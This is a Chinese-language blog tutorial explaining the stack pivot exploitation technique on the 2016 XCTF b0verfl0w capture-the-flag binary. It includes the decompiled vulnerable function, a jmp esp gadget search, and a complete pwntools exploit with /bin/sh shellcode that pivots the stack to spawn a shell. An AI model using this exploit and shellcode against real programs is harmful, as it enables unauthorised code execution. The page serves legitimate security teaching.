<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <meta name="author" content="Vancir" />
  <title>stack privot攻击技术示例</title>
  <link rel="shortcut icon" href="/favicon.ico" />
  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
  <link rel="stylesheet" href="/media/css/style.css" />
  <link rel="stylesheet" href="/media/css/highlight.css" />
  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  <script type="text/javascript" src="/media/js/outliner.js"></script>
</head>
<!--  <body> 
-->
<script type="text/javascript">
  function setTimeSpan() {
    var date = new Date();
    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
  }

  Date.prototype.format = function (format) {
    var o =
      {
        "M+": this.getMonth() + 1, //month
        "d+": this.getDate(),    //day
        "h+": this.getHours(),   //hour
        "m+": this.getMinutes(), //minute
        "s+": this.getSeconds(), //second
        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
        "S": this.getMilliseconds() //millisecond
      }
    if (/(y+)/.test(format))
      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
    for (var k in o)
      if (new RegExp("(" + k + ")").test(format))
        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
    return format;
  }
</script>

<body onLoad="setInterval(setTimeSpan,1000);">
  <div id="container">
    <div id="main" role="main">
      <header>
        <h1>stack privot攻击技术示例</h1>
      </header>
      <nav id="real_nav">
        <span>
          <a title="home" class="" href="/">home</a>
        </span>
        <span>
          <a title="categories" class="" href="/categories/">categories</a>
        </span>
        <span>
          <a title="tags" class="" href="/tags/">tags</a>
        </span>
        <span>
          <a title="tools" class="" href="/repo/">repo</a>
        </span>
        <span>
          <a title="tools" class="" href="/act/">act</a>
        </span>
        <span>
          <a title="tools" class="" href="/books/">books</a>
        </span>
        <span>
          <a title="tools" class="" href="/musics/">musics</a>
        </span>
        <span>
          <a title="tools" class="" href="/movies/">movies</a>
        </span>
        <span>
          <a title="links" class="" href="/friends/">friends</a>
        </span>
        <span>
          <a title="about" class="" href="/about/">about</a>
        </span>
        <span>
          <a title="feed" class="" href="/feed">subscribe</a>
        </span>
      </nav>
      <article class="content">
        <section class="meta">
<span class="time">
  <time datetime="2017-08-04">2017-08-04</time>
</span>

 | 
<span class="categories">
  categories
  
  <a href="/categories/#tutorials" title="tutorials">tutorials</a>&nbsp;
  
</span>


 | 
<span class="tags">
  tags
  
  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
  
  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
  
  <a href="/tags/#stack" title="stack">stack</a>&nbsp;
  
</span>

</section>
<section class="post">
<h2 id="什么是stack-privot">什么是stack privot?</h2>

<p>stack privot字面意思就是栈劫持，是指劫持栈指针指向攻击者放置有利用代码的空间去，比如指向了攻击者构造好的ROP链。</p>

<p>通常，在以下情况我们会考虑使用stack privot技术进行利用</p>
<ul>
  <li>可以控制的栈溢出的字节数较少，难以构造较长的ROP链</li>
  <li>开启了PIE(Position-Independent Executables)保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
  <li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞</li>
</ul>

<p>如果我们想要劫持栈指针，那么我们所需要的gadget就必须能够控制栈指针，比如<code class="highlighter-rouge">pop sp</code> <code class="highlighter-rouge">jmp sp</code> <code class="highlighter-rouge">add sp</code> <code class="highlighter-rouge">sub sp</code>之类的gadgets都可能拿来使用。</p>

<h2 id="漏洞分析">漏洞分析</h2>

<p>本节示例的漏洞程序可以从此处下载： <a href="http://od7mpc53s.bkt.clouddn.com/stack_privot">stack_privot</a></p>

<p>这是<code class="highlighter-rouge">2016 XCTF Quals-b0verfl0w</code>, 我们用它来演示这次的stack privot攻击</p>

<p>我们使用IDA反编译，可以看到如下：</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">vul</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-20h]@1
</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">======================"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Welcome to X-CTF 2016!"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">======================"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"What's your name?"</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Hello %s."</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>s的大小为0x20，而总共能写入的字符只有50，再加上ebp，我们能在溢出后实际利用的字节仅仅只有<code class="highlighter-rouge">50-0x20-4=14bytes</code>，只有这么小的空间，对我们构造攻击代码是十分困难的。我们选择使用stack privot技术，于是来查看一下程序中可以利用的gadgets有哪些</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  stack-privot ROPgadget <span class="nt">--binary</span> stack_privot <span class="nt">--only</span> <span class="s1">'pop|jmp|ret'</span> | <span class="nb">grep</span> <span class="s1">'esp'</span>
0x08048504 : jmp esp
</code></pre></div></div>

<p>那么这样的话，我们就可以借由<code class="highlighter-rouge">jmp esp</code>将执行流转移到栈上执行。而转移到栈上执行后，我们还需要对esp减上偏移(在返回地址时esp已经和ebp指向同一个地址)，使之转移到我们的buf中继续执行，而buf中我们事先就输入好了shellcode，那么我们在劫持完成后便可以获得一个shell</p>

<h2 id="攻击代码">攻击代码</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x0b\xcd\x80</span><span class="s">"</span>

<span class="n">sub_esp_jmp</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">'sub esp, 0x28;jmp esp'</span><span class="p">)</span>
<span class="n">jmp_esp</span> <span class="o">=</span> <span class="mh">0x08048504</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x24</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">jmp_esp</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">sub_esp_jmp</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./stack_privot'</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What's your name?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

</section>
<section align="right">
<br/>
<span>
	<a  href="/2017/08/04/ret2__libc_csu_init%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E4%BD%BF%E7%94%A8%E9%80%9A%E7%94%A8gadget/" class="pageNav"  >Previous</a>
	&nbsp;&nbsp;&nbsp;
	<a  href="/2017/08/05/how2heap-02-fastbin-dup/" class="pageNav"  >Next</a>
</span>
</section>

<script type="text/javascript">
$(function(){
  $(document).keydown(function(e) {
    var url = false;
        if (e.which == 37 || e.which == 74) {  // Left arrow and J
            
        url = 'http://localhost:4000/2017/08/04/ret2__libc_csu_init%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B-%E4%BD%BF%E7%94%A8%E9%80%9A%E7%94%A8gadget/';
        
        }
        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
            
        url = 'http://localhost:4000/2017/08/05/how2heap-02-fastbin-dup/';
        
        }
        if (url) {
            window.location = url;
        }
  });
})
</script>

      </article>
      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
        <img src="/assets/btt.png" />
      </a>
    </div>
    <footer>
      <p>
        <small>
          Powered by
          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
          <a href="/about/">Vancir</a> |
          <span class="label label-info" id="timeSpan"></span>
        </small>
      </p>
    </footer>
  </div>
</body>

</html>